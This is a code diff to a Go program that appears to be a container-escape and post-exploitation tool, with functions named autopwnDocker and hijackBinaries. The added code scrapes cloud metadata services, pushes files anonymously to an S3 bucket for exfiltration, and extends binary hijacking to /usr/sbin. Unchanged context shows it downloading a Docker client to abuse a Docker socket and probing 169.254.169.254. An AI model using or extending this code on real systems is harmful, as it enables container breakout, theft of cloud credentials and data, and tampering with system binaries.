@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"fmt"
 	"io"
 	"io/ioutil"
@@ -13,7 +14,75 @@ import (
 	"strconv"
 	"strings"
 	"time"
+
+	"github.com/aws/aws-sdk-go/aws"
+	"github.com/aws/aws-sdk-go/aws/credentials"
+	"github.com/aws/aws-sdk-go/aws/session"
+	"github.com/aws/aws-sdk-go/service/s3/s3manager"
 )
+
+func scrapeGcpMetadata(host, port string) (string, error) {
+	connStr := fmt.Sprintf("%s:%s", host, port)
+	d := net.Dialer{Timeout: time.Second * 5}
+
+	fmt.Println("[+] Attempting to connect to: ", connStr)
+	conn, err := d.Dial("tcp", connStr)
+	if err != nil {
+		return "", err
+	}
+	fmt.Fprintf(conn, "GET / HTTP/1.0\r\n\r\n")
+	var buf bytes.Buffer
+	bytesWritten, err := io.Copy(&buf, conn)
+	if err != nil {
+		return "", err
+	}
+	fmt.Printf("[*] Bytes received from metadata: %d\n", bytesWritten)
+	return buf.String(), nil
+}
+
+func testUploadOfS3(fileToPush, s3Bucket, s3Region string) {
+	fmt.Printf("[+] Pushing %s to -> %s\n", fileToPush, s3Bucket)
+
+	s, err := session.NewSession(&aws.Config{
+		Region:      aws.String(s3Region),
+		Credentials: credentials.AnonymousCredentials,
+	})
+
+	if err != nil {
+		fmt.Println("[ERROR] ", err)
+	}
+
+	err = s3Push(s, fileToPush, s3Bucket)
+	if err != nil {
+		fmt.Println("[ERROR] ", err)
+	}
+}
+
+func s3Push(s *session.Session, filename, s3Bucket string) error {
+	uploader := s3manager.NewUploader(s)
+
+	file, err := os.Open(filename)
+	if err != nil {
+		return fmt.Errorf("failed to open file %q, %v", filename, err)
+	}
+
+	result, err := uploader.Upload(&s3manager.UploadInput{
+		Bucket: aws.String(s3Bucket),
+		Key:    aws.String(filename),
+		Body:   file,
+	})
+	if err != nil {
+		return fmt.Errorf("failed to upload file, %v", err)
+	}
+
+	fmt.Println("[*] Data uploaded to:", *aws.String(result.Location))
+
+	return nil
+}
+
+func getGcpMetada() {
+	fmt.Println("[+] Attempting to get GCP Metadata")
+}
 
 func execDocker(dockerSockPath string) error {
 	cmd := "./docker/docker -H unix://" + dockerSockPath + " run docker id"
@@ -50,7 +119,6 @@ func autopwnDocker(dockerSock string) error {
 		if *verbosePtr {
 			fmt.Println("[*] Getting Docker client...")
 		}
-
 		if err := downloadFile("docker-18.09.2.tgz", fileUrl); err != nil {
 			return err
 		}
@@ -227,7 +295,7 @@ func checkMetadataServices() {
 		}
 
 	} else {
-		if queryEndpoint("http://169.254.169.254/latest/meta-data/") {
+		if queryEndpoint("http://169.254.169.254/") {
 			exitCode = 1
 		}
 		if queryEndpoint("http://kubernetes.default.svc/") {
@@ -355,6 +423,7 @@ func hijackBinaries(hijackCommand string) {
 	hijackDirectory("/bin", command)
 	hijackDirectory("/sbin", command)
 	hijackDirectory("/usr/bin", command)
+	hijackDirectory("/usr/sbin", command)
 }
 
 func copyFile(src, dst string) error {
@@ -547,6 +616,20 @@ func processInterfaces() error {
 		interfaceResults = append(interfaceResults, result)
 	}
 	return nil
+}
+
+func findHttpSockets() {
+	fmt.Println("[+] Looking for HTTP enabled Sockets")
+	// dockerdVal, checkResult := checkForDockerEnvSock()
+	// if checkResult {
+	// 	fmt.Println("[!] Dockerd DOCKER_HOST found:", dockerdVal)
+	// }
+	sockets, _ := getValidSockets(*pathPtr)
+	httpSockets := getHTTPEnabledSockets(sockets)
+	// dockerSocks := getDockerEnabledSockets(httpSockets)
+	for _, aSock := range httpSockets {
+		fmt.Println("[!] Valid HTTP Socket:", aSock)
+	}
 }
 
 func findDockerD() {
